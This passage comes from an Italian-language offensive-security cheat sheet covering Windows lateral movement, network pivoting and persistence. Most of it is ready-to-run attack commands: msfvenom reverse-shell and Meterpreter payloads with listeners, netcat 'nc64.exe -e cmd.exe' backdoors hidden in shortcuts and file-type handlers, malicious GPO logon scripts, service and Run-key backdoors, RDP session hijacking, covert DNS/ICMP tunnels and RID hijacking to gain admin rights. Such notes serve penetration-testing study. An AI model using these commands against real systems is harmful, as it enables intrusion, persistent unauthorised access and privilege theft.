Invoke-CimMethod -InputObject $Service -MethodName StartService/StopService/Delete #comando che preso l'handle, avvia/ferma/elimina il servizio
``` 
_Comandi per creare un task da remoto:_
```powershell 
$Command = "<comando o eseguibile>" 
$Args = "<argomenti del comando>" #commando e argomenti vanno divisi e inseriti in variabili d'ambiente
```
```powershell        
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args #comando per la creazione dell'azione nello schedule
```
```powershell        
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<nome task>" #comando per la registrazione del task
```
```powershell        
Start-ScheduledTask -CimSession $Session -TaskName "<nome task>" #comando che avvia il task
```
```powershell       
Unregister-ScheduledTask -CimSession $Session -TaskName "<nome task>" #comando per eliminarlo
``` 
_Comandi per installare un nostro MSI installer:_ 
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<path installer>"; Options = ""; AllUsers = $false} #comando per installare un nostro MSI
```
```cmd
wmic /node:<ip> /user:<eventuale dominio>\<utente> product call install PackageLocation=<Path installer> #stesso comando ma per CMD
``` 
- __RDP hijacking:__

_RDP hijacking funziona se vi è una connessione RDP dove è chiusa e non è stato fatto il logout e quindi solo con il reboot del server si potrà chiudere definitivamente, funziona sulle versioni di windows server 2016, nella 2019 richiede la password._

_Comandi:_
```
      #runnato con privilegi di SYSTEM
      query user #query delle sessioni attive, se nell'output notiamo una sessione in state DISC significa che è vulnerabile
```     
OUPUT di esempio:
```
USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
administrator         rdp-tcp#6           3  Active          .  6/3/2023 5:09 AM
serverAdmin                               4  Disc            .  6/7/2023 7:51 AM
```
```cmd
tscon 4 /dest:rdp-tcp#6 #comando per dire di legare la sessione di ID 4 alla nostra che è la 3
```
##### Port Forwarding:

_Tramite tecniche di port forwarding è possibile fare pivoting tra le macchine_

__N.B: si suppone che si abbia compromesso almeno una macchina per poter applicare le seguenti metodologie.__

- __SSH Tunneling:__

1) _Remote port Forwarding:_
 
__N.B: i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso le macchine target.__
  
_Comandi:_
```bash
useradd <nome user> -m -d <path directory user> -s <shell da utilizzare> #comando per creare un'utente sulla macchina compromessa che verrà utilizzato per la connessione SSH con le altre macchine target
```
```bash
passwd <password> #comando per impostare password
```
```bash
ssh <nome utente>@<ip> -R <porta aperta della propria machine>:<ip remoto>:<porta target> -N  #comando che si connette alla macchina compromessa e che poi binda una porta remota con la propria porta, -N per creare solo la connessione
```
ES: 

`ssh user@3.2.1.9 -R 3389:3.2.2.2:3389 -N /3389 porta RDP/`

`xfreerdp /v:127.0.0.1 /u:user /p:passwd123`

2) _Local port Forwarding:_

__N.B: i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso le macchine target.__

_Comandi:_
```bash
ssh <nome utente>@<ip> -L *:<porta della propria macchina>:<ip target>:<porta target> -N #comando che si connetta alla macchina compromessa, mettiamo in ascolto tutte le interfacce di rete disponibili e che poi binda la nostra porta con quella target remota
```
```bash
ssh <nome utente>@<ip> -L  <porta locale>:<ip remoto>:<porta remota> <porta locale>:<ip remoto>:<porta remota> #comando per fare il local forward di più porte
```
```cmd
netsh advfirewall firewall add rule name="<nome regola>" dir=<specifica direzione> action=<azione> protocol=<protocollo> localport=<porta> #comando per modificare le regole del firewall della nostra kali machine, a seconda del tunneling creato
```
ES:

`ssh user@3.2.1.9 -L *:80:127.0.0.1:80 -N`

_Ci andremo a connettere prima alla nostra kali machine da li accediamo alla macchina compromessa con __"user@3.2.1.9"__ subito dopo indichiamo di creare un socket __"*.80"__ che ascolta su tutte le interfacce di rete disponibili alla porta 80, per poi bindarla con __"127.0.0.1:80"__ la porta 80 della macchina vittima su cui è stato lanciato il comando SSH con il proprio indirizzo quindi quello di loopback._

`netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80`

_Verrà creato una regola che permette connessioni in ingresso alla porta 80._

3) _Dynamic Forwarding con proxychains:_

_Dynamic forwarding locale è utilizzato come tecnica di pivoting per le reti, tutti i comandi vengono prima inviati al __"Socks"__ locale e poi alla macchina target_

_Comandi:_

_Il primo comando si connette alla machine target e nel mentre inizializza il proxysocks all'indirizzo __"127.0.0.1:9050"___
```bash
ssh -D 9050 <user>@<ip> #comando per abilitare il dynamic forwarding 
```
```bash
tail -4 /etc/proxychains.conf #comando per vedere se proxysocks è stato settato
```
_I seguenti comandi avviano nmap che a seconda dei parametri o comandi assegnati passando per __"proxychains"__ li esegue_
```bash
proxychains nmap -v -sn <ip> #comando che runna nmap e poi tramite proxychains redirecta i comandi dalla porta 9950 a ssh
```
```bash
proxychains nmap -v -Pn -sT <ip> #comando per runnare nmap verso una macchina windows sempre utilizzando le proxychains
```
```bash
proxychains nmap -iflist #comando per runnare nmap e lista le interfacce di rete disponibili
```
_Allego anche dei comandi in bash, cmd e powershell che enuemerano gli host di una determinata subnet solo se il ping è permesso all'interno della rete:_
```bash
for i in {1..254} ;do (ping -c 1 <ip subnet>.$i | grep "bytes from" &) ;done #comando bash che data una subnet enumera tramite ping
```
```cmd
for /L %i in (1 1 254) do ping <ip subnet>.%i -n 1 -w 100 | find "Reply" #comando cmd che data una subnet enumera tramite ping
```
```powershell
1..254 | % {"<ip subnet>.$($_): $(Test-Connection -count 1 -comp <ip subnet>.$($_) -quiet)"} #comando powershell che data una subnet enumera tramite ping
```
__N.B: prestare attenzione ai bits dedicati agli hosts in questo caso abbiamo ipotizzato che fossero 8 quindi da 1 a 254__

ES:

`ssh -D 9050 ubuntu@10.129.200.60`

`proxychains nmap -v -sn 176.14.5.1-200`

Nell'esempio sopra i pacchetti nmap seguono questo percorso:

nmap----> 127.0.0.1:9050----> SSH:22----> scanning delle reti 176.14.5.1-200

_Senza Proxysocks non avremmo avuto la possibilità di forwardare i pacchetti di nmap per scannerizzare le subnet scritte perchè solo con una semplice connessione SSH non sarebbe stato possibile_

- _Metasploit e Proxychains:_

_Possiamo utilizzare le proxychains insieme a metasploit con la sua vasta gamme di moduli_

_Comandi:_
```bash
proxychains msfconsole #comando per avviare msfconsole con le proxychains
```
- _RDP e Proxychains:_

_Abbiamo la possibilità di connettersi con RDP passando sempre per le proxychains, quindi per esempio accedere ad una macchina che normalmenete non sarebbe accessibile_

_Comandi:_
```bash
proxychains xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution #comando per avviare una connessione RDP utilizzando le proxychains
```
- _Shuttle via SSH:_

_Shuttle è uno script python che funziona solo tramite SSH, è abbastanza veloce perchè in pochi comandi prepara tutte le route table_

_Comandi:_
```bash
sudo apt-get install sshuttle #comando per installare sshuttle
```
```bash
sudo sshuttle -r <nome user>@<ip> <subnet> -v # #comando che si connette ad SSH e aggiunge alle route table la subnet specificata
```
_Questi 2 comandi hanno permesso di preparare il tutto e possiamo lanciare ulteriori comandi di esempio:_

`mmap -v -sV -p3389 192.168.5.23 -A -Pn`

- _Netsh:_

_Netsh (Network shell) è la shell messa a disposizione da windows per l'ordinaria amministrazione di rete di un pc windows ma nel nostro caso può essere usato a nostro vantaggio come: scoprire eventuali rotte di rete, vedere la configurazione del firewall, aggiungere proxy, ecc..._

_Comandi:_
```cmd
netsh.exe interface portproxy add <protocollo> listenport=<porta in ascolto> listenaddress=<ip in ascolto> connectport=<porta a cui connettersi> connectaddress=<ip a cui connettersi> #comando che fa il forwarding di una porta remota ad una porta in ascolto 
```
```cmd
netsh.exe interface portproxy show <protocollo> #comando per visualizzare com'è avvenuto il forward delle porte
```
ES: `netsh.exe interface portproxy add v4tov4 listenport=7000 listenaddress=12.122.13.13 connectport=139 connectaddress=173.14.22.22`

_Andando ad utilizzare il socket __"12.122.13.13:7000"__ che ha forwardato la porta __"139"__ alla sua __"7000"__, potremmo visionare il servizio SMB_


- _Chisel:_

_Chisel è un tool di tunneling molto utilizzato perchè scritto nel linguaggio Go quindi ha anche un fattore di velocità a suo vantaggio, sfrutta pure lui socks_

_Comandi:_
```bash
git clone https://github.com/jpillora/chisel.git 
cd chisel
sudo apt install gccgo-go 
go build #comandi per copiare e preparare il tool
```
```bash
scp chisel <nome utente>@<ip>:<path dove salvarlo> #comando per passare il binario di chisel alla macchina vittima
```
_Chisel permette due modalità la standard dove il chisel server è la macchina vittima mentre il chisel client è la nostra macchina ma può accadere che vi sia di mezzo un firewall che blocchi le connessioni in entrata ed è per questo che chisel mette a disposizione la modalità __"reverse"__ cioè il chisel server lo diverrà la nostra macchina mentre il chisel client lo sarà la macchina vittima_

__N.B: Le varie librerie Go a disposizione nelle macchine target potrebbero non essere aggiornato o del tutto mancanti, quindi va posta un po' di attenzione__

_Chisel standard:_
```bash
chisel server -v -p <porta> --socks5 #comando che avvia il chisel server sulla macchina vittima con utilizzo di socks5 e si tiene in ascolto su una porta selezionata
```
```bash
chisel client -v <ip server chisel>:<porta server chisel in ascolto> socks #comando che avvia il chisel client sulla nostra macchina ed esegue la connessione
```
```bash
nano /etc/proxychains.conf #comando che permette la modifica del file proxychains.conf
socks5 127.0.0.1 1080 #scritta da aggiungere alla fine del file per utilizzare socks5 in quanto sia chisel client che chisel server ascoltano al socket di rete 127.0.0.1:1080
```
_Chisel reverse:_
```bash
chisel server --reverse -v -p <porta> --socks5 #comando che avvia il chisel server sulla nostra macchina con utilizzo di socks5 e si tiene in ascolto su una porta selezionata
```
```bash
chisel client -v <ip server chisel>:<porta server chisel in ascolto> R:socks #comando che avvia il chisel client sulla macchina vittima ed esegue la connessione
```
```bash     
nano /etc/proxychains.conf #comando che permette la modifica del file proxychains.conf
socks5 127.0.0.1 1080 #scritta da aggiungere alla fine del file per utilizzare socks5 in quanto sia chisel client che chisel server ascoltano al socket di rete 127.0.0.1:1080
```
_Ora tranquillamente con entrambi i metodi possiamo lanciare un comando per esempio, verso un host sotto subnet che non potevamo raggiungere prima_

ES: `proxychains xfreerdp /v:192.168.2.13 /u:user /p:pass #esempio di un comando che esegue una connessione RDP verso una macchina che prima non era possibile raggiungere` 


- __Reverse shell via forwarding:__

_Ottenere una revshell via forwarding consiste nel sapersi muovere con le porte in modo da poter ottenere una revshell di una macchina non accessibile dall'esterno_

_In questo caso verrà esaminato l'insieme del dynamic port forwarding e del remote port forwarding per ottenere una revshell, abbiamo 3 macchine una kali machine la nostra macchina, un ubuntu server di mezzo e una windows server per ottenere una revshell_

_Spiegazione tecnica:_

kali machine con listener meterpreter su 0.0.0.0:8000---> SSH che binda la porta 8080 dell'ubuntu con la 8000 della kali machine ----> ubuntu server con porta 8080 in ascolto ----> windows server con eseguibile malevolo che se runnato punta alla porta 8080 e indirizzo del server ubuntu, il quale server tramite comando SSH binda la sua 8080 alla 8000 della kali e che alla fine ci fa ottenere la revshell

_Comandi:_
```bash
ssh -D 9050 <nome user>@<ip ubuntu server> #comando che si connette con SSH al ubuntu server e abilita alla kali machine i proxysocks
```
```bash
proxychains xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution #comando per avviare una connessione RDP utilizzando le proxychains, la windows ha la porta RDP aperta
```
```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <ip ubuntu server> -f exe -o <nome eseguibile>.exe LPORT=8080 #comando che crea l'eseguibile che punta alla porta 8080 dell'ubuntu
```
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport 8000; exploit" #comando che crea il listener sulla kali
```
_Ora andrà passato prima l'eseguibile all'ubuntu server e poi alla windows machine per sapere come fare andare [qui](./#downloadupload-file) per poi bindare tutte le porte con il comando SSH specifico_
```bash
ssh -R <ip ubuntu server>:8080:0.0.0.0:8000 ubuntu@<ip ubuntu server> -vN #comando che si connette all'ubuntu server e binda in remote la porta 8080 dell'ubuntu server con la 8000 della kali
```
_eseguiamo il .exe malevolo __"(abbiamo la connessione RDP alla windows)"__ e potremo notare che al listener sarà avvenuta la connessione_

- __Socat Forwarding:__

_Socat può essere utilizzato quando SSH non è disponibile, ed è anche molto piu "forte" in quando utilizzandolo su una macchina vittima permette di aprire un listener su una porta e nel mentre si può fare il binding con un'altra porta_

__N.B: va caricato sulla macchina compromessa e può essere maggiormente rilevabile rispetto al semplice SSH.
i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso le macchine target.__
 
_Comandi:_
```bash
socat TCP4-LISTEN:<porta macchina compromessa>,fork TCP4:<ip target>:<porta target> #comando per bindare una porta con socat e in seguito utilizzarla
```
ES:

`socat TCP4-LISTEN:3389,fork TCP4:3.5.4.3:3389`

_Andremo a bindare la porta della 3389 della macchina compromessa alla 3389 del ip specificato, per poi poterla visitare tramite browser_

`TCP4-LISTEN:80,fork TCP4:<ip_della_nostra_macchina>:80`

_Andremo a bindare la porta 80 della macchina compromessa alla 80 della nostra machine._

- __DNS Tunneling:__

_Il dns tunneling sfrutta lo stesso concetto del SSH tunneling solo tramite il protocollo DNS ed ha il vantaggio di essere meno rilevabile, in quanto in una rete le richieste DNS possono essere moltissime mentre quelle SSH in minor numero_

- _DnsCat2:_

_Tool in ruby utilizzato per il dns tunneling va settato un server sulla nostra macchina e un client sulla macchina vittima_

_Comandi:_
```bash
git clone https://github.com/iagox86/dnscat2.git 
cd dnscat2/server/
sudo gem install bundler
bundle install #comando per copiare e rendere operativo il tool
```
```bash
sudo ruby dnscat2.rb --dns host=<ip della propria macchina>,port=53,domain=<dominio se c'è> --no-cache #comando che setta il server 
```
__N.B: ricordarsi di copiare e incollare il campo --secret dopo aver avviato il server, perchè la chiave verrà passata poi al client per l'autenticazione__
```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git #comando per scaricare il .ps1 da mandare alla macchina windows target
```
__N.B: il .ps1 va passato alla macchina vittima__
```powershell
Import-Module .\dnscat2.ps1 #comando che importa il modulo nella powershell 
```
```powershell
Start-Dnscat2 -DNSserver <ip server dns> -Domain <dominio se c'è> -PreSharedSecret <chiave per l'autenticazione> -Exec <comando da eseguire> #comando che prepara il client DNS sulla macchina vittima
```
```powershell
dnscat2> ? #comando di dnscat2 per aprire l'help
```
```powershell
dnscat2> windows -i <num finestra creata> #comando di dnscat2 per entrare nella finestra creata con il dns tunneling
```
__N.B: il tool ha un ritardo abbastanza sostanzioso nel mandare e ricevere i comandi__

- __ICMP Tunneling con Socks:__

_L'ICMP tunneling consiste nel tunneling tramite un client e un server, vengono sfruttati i pacchetti ICMP. Vi è un però in questo tipo di tunneling; è possibile solo se il firewall permette di utilizzare il comando ping all'interno della rete_

_Comandi:_
```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo apt install autoconf #installarlo se non si ha il pacchetto
sudo ./autogen.sh #comandi per costruire ptunnerl.ng
```
```bash
sudo ./ptunnel-ng -r<ip server> -R<port> #comando per impostare l'ICMP server sulla macchina target
```
```bash
sudo ./ptunnel-ng -p<ip locale> -l<porta locale> -r<ip server remoto> -R<porta remota> #comando per impostare il client sulla macchina target
```
```bash
ssh -p<porta locale> -l ubuntu 127.0.0.1 #comando che si connette a SSH tramite ICMP tunneling
```
```bash
ssh -D 9050 -p<porta locale> -l ubuntu 127.0.0.1 #comando che oltre a connettersi attiva proxysocks
```
```bash
proxychains nmap -sV -sT <ip host target> -p<porta target> #comando che utilizza nmap su un host target tramite proxychains
```
- __SocksOverRDP e Proxifier:__

_SocksoverRDP è un tool che utilizza i DVC(Dynamic Virtual Channels) del RDP per il tunneling delle connessioni del remote desktop protocol_

_Link ai tool:_

1) [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP/releases), tool per il tunneling RDP

2) [Proxifier](https://www.proxifier.com/download/#win-tab), tool per il proxychains

_Comandi:_

_Allora come primi passi dobbiamo scaricare __"SocksOverRDPx64.zip"__ e __"Proxifier"__, i file .zip vanno passati alla pivot machine (python server) e vanno decompressi, andrà poi importata una DLL e fatta la connessione RDP con la macchina target_
```bash
python3 -m http.server 80 #comando per avviare il webserver
```
```powershell
curl -o <nome>.zip http://<ip macchina kali>/<zip di sockoverRDP>.zip #comando per passare dalla nostra macchina alla pivot machine SockOverRDP
```
_Estraiamo la cartella e i due file .exe e .dll li trasferiamo nel desktop, avviamo una powershell come amministratori e inviamo i seguenti comandi_
```cmd
regsvr32.exe SocksOverRDP-Plugin.dll #comando per importare la .dll
```
```cmd
mstsc.exe #comando che avvia un eseguibile per la connessione a Remote Desktop Protocol verso la macchina target
```
_Adesso andrà fatto un ulteriore spostamento del __"SocksOverRDPx64.zip"__ verso la target machine, per farlo possiamo creare sulla pivot machine una cartella condivisibile tramite SMB e con all'interno i 2 file del .zip_
```
creare una nuova cartella-> inserire i due .file .dll e .exe-> click destro proprietà-> condivisione-> condivisione avanzata-> condvidi cartella #passi per creare la cartella condivisibile
```
```
\\<ip pivot host>\<nome cartella> #comando che se inserito su esplora risorse, inserite le credenziali possiamo accedere alla cartella condivisibile e scaricare i due file
```
_trasferiamo i 2 file nel desktop apriamo una shell privilegiata e eseguiamo questi 2 comandi:_
```cmd
regsvr32.exe SocksOverRDP-Plugin.dll #comando per importare la .dll
```
```cmd
.\SocksOverRDP-Server.exe #comando per avviare il server che farà da tunneling
```
_Ritornando sulla pivot machine, aprendo un cmd shell e lanciano il seguente comando:_
```bash      
netstat -antb | findstr 1080 #comando che lista le connessioni e poi ricerca la stringa di valore 1080
TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING #output comando
```
_Possiamo notare un socket di rete aperto sul localhost alla porta 1080, in ascolto su ogni interfaccia di rete e ogni porta, questo sta a significare che il SOCKS listener è stato avviato; ora non resta che avviare proxifier con i seguenti passi:_
```
profile-> proxy servers-> add-> ip 127.0.0.1 porta 1080 protocollo SOCKS5-> ok #passi per preparare il tool proxifier
```
_Ora tutto è pronto, il proxy server è impostato, ogni comando inviato passerà da lui per poi continuare la sua strada verso la pivot machine tramite RDP_

- __Sito per mappe mentali:__

_Il pivoting tra diverse macchine può diventare tedioso perchè può capitare che un host vadi offline, che una subnet venga cambiata e mille altri problemi è quindi importante tenere con se una piccola mappa mentale della rete target tramite il sito [diagrams](https://app.diagrams.net/)_

### Persistence:

_La persistence è la pratica di mantenere un accesso alla macchina compromessa, perchè non è sempre e possibile rientrare con le stesse metodologie adottate nella foothold iniziale_

##### Gruppi:

__E' richiesto di avere un account con privilegi__

_La prima tecnica di persistenza è quella di aggiungere un utente meno privilegiato ad un gruppo che invece abbia più permessi come l'administrators group, il backup operators group o il remote management users.
Per ogni gruppo ci sono vantaggi e svantaggi, l'administrators da molti privilegi ma può dare nell'occhio, il backup operators ha meno privilegi ma può dumpare SAM e SYSTEM e vedere le chiavi di registro e il remote management users permette il controllo da remoto (RDP)_

_Comandi:_
```cmd
net localgroup <nome gruppo> <nome utente> /add #comando CMD per aggiungere un utente al gruppo 
```
_La connessione da remoto però innesca l'attivazione del __"LocalAccountTokenFilterPolicy"__ policy dell' [UAC](./#uac) che toglie i poteri d'amministratori derivati dai gruppi se connessi da remoto_
```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 #comando per disattivare la policy
```
- __Gruppi annidati:__

_La tecnica consiste nel creare diversi gruppi dove di volta in volta aggiungiamo gruppi fasulli per poi aggiungere un gruppo come quello degli amministratori a questo nido di gruppi ed infine aggiungere il nostro utente che avrà i privilegi del gruppo di amministratori_

_Comandi:_
```powershell
New-ADGroup -Path "OU=<nome ou>,OU=<nome ou>,DC=<nome DC>,DC=<altro nome DC>,DC=<altro nome DC>" -Name "<nome gruppo>" -SamAccountName "<nome SAM>" -DisplayName "<nome che vogliamo mostrare" -GroupScope Global -GroupCategory Security #comando per creare un gruppo
```
 _Quindi creiamo quanti gruppi vogliamo per poi aggiungere uno ad uno con questo comando_
```powershell
Add-ADGroupMember -Identity "<nome SAM gruppo d'aggiungere>" -Members "<nome SAM gruppo annidato>" #comando per aggiungere un gruppo ad un altro gruppo
```      
__Continuando ad aggiungere gruppo dentro ad altri gruppi poi va aggiunto un gruppo di amministratori o qualsiasi cosa si voglia__

_Aggiungiamo l'user al gruppo iniziale_
```powershell
Add-ADGroupMember -Identity "<nome SAM gruppo iniziale>" -Members "<nome SAM user>" #comando per aggiungere l'user ad un gruppo
```
```powershell
Get-ADGroupMember -Identity "<nome gruppo admin>" #comando per controllare se l'user è nel gruppo di admin
```
- __AdminSDHolder:__

_AdminSDHolder è un template container presente in ogni dominio che ogni 60 minuti tramite il processo __"SDProp"__ applica la sua ACL a tutti i gruppi considerati protetti di cui ne fanno anche parte Domain admins, Administrators, Enterprise Admins, ecc..._

_Comandi:_ 
```cmd
runas /netonly /user:<dominio>\<utente> cmd.exe #comando per aprire una nuova shell con l'utente selezionato
```
```cmd
mmc #comando per aprire microsoft management console
```
```
File-> aggiungi/rimuovi snap-in-> Active directory Utenti e Computer-> AdminSDHolder-> click destro-> Proprietà-> sicurezza-> aggiungi-> aggiungiamo il nostro utente-> controlli nomi-> permessi completi-> attendere 60 minuti e il nostro utente avrà il controllo completo sui gruppi protetti #passi per aggiungere l'user scelto da noi alla cartella AdminSDHolder con permessi completi
```
_Esiste altrimenti lo [script](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1) che può semplificarci la vita_

- __GPO (Group Policy Management):__

_Il GPO si occupa del controllo delle policy di configurazione locale delle varie macchine all'interno dell'AD, per esempio ha il compito di tenere le configurazione dell'AV o quali script devono runnare al boot del computer_

_Due tecniche comuni per la persistence contro la GPO:_

 1) Restricted Group Membership: permette l'accesso ad ogni host nell'AD

 2) Logon Script Deployment: decisione su quale script runna ogni volta che il pc viene avviato, esempio una revshell

_Comandi:_

__N.B: I .bat sono più stabili con la GPO__
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con all'interno una revshell
```
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <porta>;exploit" #comando per startare il listener sulla nostra machine
```
```cmd
mmc #comando per aprire il microsoft management console
```
```
File-> aggiungimi/rimuovi snap-in-> GPO-> aggiungi-> cliccare su qualsiasi OU si voglia-> creare una GPO con qualsiasi nome-> click destro-> applica poi-> Group Policy Management Editor-> policies-> impostazioni finestre-> scripts-> Logon-> proprietà-> selezionare il nostro script con la revshell->applica e ok #passi completi per aggiungere la propria GPO policy che funziona ad ogni boot del pc
```
```
andare sulla nostra OU selezionata-> delega-> click destro sul gruppo ottenuto con la revshell-> modifica impostazioni-> elimina,modifica sicurezza-> click sugli altri gruppi e li rimuoviamo-> sicurezza-> avanzate-> rimuovi il proprietario dai permessi-> sempre in sicurezza aggiungi clicchiamo-> aggiungiamo Domain computers-> gli diamo i permessi di lettura-> clicchiamo ok e rimuoviamo l'ultimo gruppo rimasto #passi completi per non fare leggere la nostra GPO
```
##### Privilegi:

_I privilegi possono essere fonte di persistenza, in quanto vi sono alcuni di loro che danno più poteri del necessario_

- __SeBackupPrivilege/SeRestorePrivilege:__

_Sono due priviliegi che danno molto potere, __"SeBackupPrivilege"__ permette di leggere ogni file nel sistema invece __"SeRestorePrivilege"__ permette di scrivere ogni file del sistema, avendo tali poteri è possibile modificare qualsiasi cosa._

1) Modifica policy di sicurezza:

_Comandi:_
```cmd
secedit /export /cfg <nome file>.inf #comando per esportare le policy di sicurezza locale
```
_Avendola esportata potremmo aggiungere degli account nei diversi privilegi che vediamo scritti e poi ricaricarla nel sistema_
```cmd
secedit /import /cfg <nome file>.inf /db config.sdb #comando che importa la nuova configurazione modificata nel database di sicurezza
```
```cmd
secedit /configure /db config.sdb /cfg <nome file>.inf #comando che applica la configurazione importata nel database di sicurezza
```
##### Servizi:

_La modifica di servizi già esistenti o la creazione di nuovi può essere utilizzato a nostro favore_

- __Backdoor nei servizi:__

_La modifica della path del binario a cui punta un servizio può essere utilizzata per la creazione di una backdoor_

_Comandi:_
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe-service -o <nome eseguibile>.exe #commando che crea un eseguibile con al suo interno una revshell
```
```cmd
sc.exe create <nome servizio> binPath= "<path dell'eseguibile>" start= auto #comando per creare un servizio che punti all'eseguibile
```
```cmd
sc.exe start <nome servizio> #comando per avviare il servizio
```
- __Modificare servizi:__

_La possibilità di modificare i servizi già presenti può essere utilizzato a nostro vantaggio e da meno nell'occhio_

_Comandi:_
```cmd
sc.exe query state=all #comando per listare tutti i servizi
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe-service -o <nome eseguibile>.exe #commando che crea un eseguibile con al suo interno una revshell
```
```cmd
sc.exe config <nome servizio da modificare> binPath= "<path dell'eseguibile>" start= auto obj= "<account che utilizza il servizio>" #comando per modificare un servizio
```   
##### File:

- __Eseguibili:__

_Un file eseguibile apre le porte a moltissime opzioni di persistenza come una piccola backdoor_

_Comandi:_
```bash
msfvenom -a x64 --platform windows -x <nome eseguibile utilizzato>.exe -k -p windows/x64/shell_reverse_tcp lhost=<ip> lport=<porta> -b "\x00" -f exe -o <nome nuovo eseguibile>.exe #comando per generare un eseguibile con al suo interno una revshell
```
- __Shortcut file:__

_Anche le shortcut possono essere fonti di backdoor andandole a modificare_

_Comandi:_
```powershell
Script.ps1: #nome dello script con di seguito il codice da scriverci
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <ip> <porta>" #comando che runna un processo che si collega ad un dato ip e porta
C:\Windows\System32\<nome eseguibile>.exe #avvio dell'eseguibile che verrà modificato
```
```cmd
powershell.exe -WindowStyle hidden C:\Windows\Tools\script.ps1 #comando da sostituire alla destinazione del collegamento
```
```
shortcut-> proprietà-> destinazione -> script creato da noi #path per modificare il collegamento
```
- __Hijacking ProgID:__

_Un file possiede una determinata estensione, bene è possibile andare a modificare il ProgID di quela file (Viene spiegato [qui](./#bypass-uac) cos'è il ProgID, nell'exploit con fodhelper)_

_Comandi:_
```
HKEY_LOCAL_MACHINE\SOFTWARE\classes\.<estensione> #path per vedere il nome del ProgID
```
 ES: `HKEY_LOCAL_MACHINE\SOFTWARE\classes\.txt  = txfile/txtlegacy`
```
HKEY_LOCAL_MACHINE\SOFTWARE\classes\<nome ProgID>\shell\open\command #path dove troviamo l'eseguibile che viene ricercato ogni volta che apriamo una determinata estensione
```
```powershell
Script.ps1: #nome dello script con di seguito il codice da scriverci
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <ip> <porta>" #comando che runna un processo che si collega ad una dato ip e porta
C:\Windows\system32\<nome eseguibile>.exe  #comando che runna l'eseguibile
```
```cmd
powershell.exe -WindowStyle hidden C:\Windows\Tools\script.ps1 #valore da cambiare al default value della chiave di registro
```  
##### Registri:

_La spiegazione di cosa sono e di quali sono i registri si trova [qui](./#register-keys)_

_I registri sono una componente fondamentale in windows che se modificati a nostro vantaggio possono tornare molto utili_

- __Registri di avvio:__

_Il target sono questi sottoregistri di avvio:_
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```    
__N.B: HKCU si applica solo all'utente corrente, HKLM si applica a tutti; la key "Run" avvia gli eseguibili al suo interno ogni volta che vi è il login mentre "RunOnce" solo una volta.__

_Comandi:_
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
```
```
Editor registri-> HKLM\Software\Microsoft\Windows\CurrentVersion\Run-> creiamo un value di tipo REG_EXPAND_SZ che punta al path del nostro eseguibile #passi per creare un value che punti al nostro eseguibile
```
##### Varie:

__E' richiesto di avere un account con privilegi__

- __Secure Descriptor (WinRM):__

_Possiamo permettere ad un nostro utente creato per la persistence di poter loggare da remoto tramite la modifica del secure desciptor_

_Comandi:_
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI #comando per aprire graficamente il WinRM secure descriptor
```
```
selezionare l'utente -> controllo completo #passi per applicare la modifiche
```
- __RID Hijacking:__

_Il RID è un identificativo numerico per i vari utenti ed è utilizzato dal LSASS infatti quando vi è un'accesso LSASS collega il RID di un utente ad un token di accesso dell'UAC; andando a fare l'Hijacking del RID un semplice utente può risultare come un admin_

_Comandi:_
```powershell
Get-LocalUser | fl * #comando per ottenere info sugli utenti, specialmente per capire il RID dell'admin
```
```powershell
PsExec64.exe -i -s regedit #comando per avviare regedit con privilegi di amministratore
```
```
HKLM\SAM\SAM\Domains\Account\Users\ #path per modificare i RID
```
_Nella folder Users, potremmo notare diverse altre subfolder con numeri esadecimale, se convertiti in decimale possiamo ricavare il RID ottenuto con il comando in powershell; ora non ci rimane che selezionare la subfolder del nostro utente, andare al valore __"F"__ che conterrà il RID (registrato in little-endian) e modificarlo con quello dell'admin_

ES:

`Admin = RID(500) ->  Esadecimale(0x1F4) -> Subkey(000001F4)`

`UserMalevolo = RID(502) -> Esadecimale(0x1F6) -> Subkey(000001F6) -> Value F che verrà cambiato da (F6 10) in (F4 10)`

_UserMalevolo una volta rieffettuato il login avrà i privilegi di admin_

- __SID History:__

_Una history dei SID che ha avuto un'utente con i relativi permessi di cui godeva_

_Comandi:_
```powershell
Get-ADUser <nome utente> -properties sidhistory #comando che recupera la SID history
```
```powershell
Get-ADGroup "<nome gruppo>" #comando per recuperare il SID del gruppo che in seguito verrà utilizzato
```
```powershell
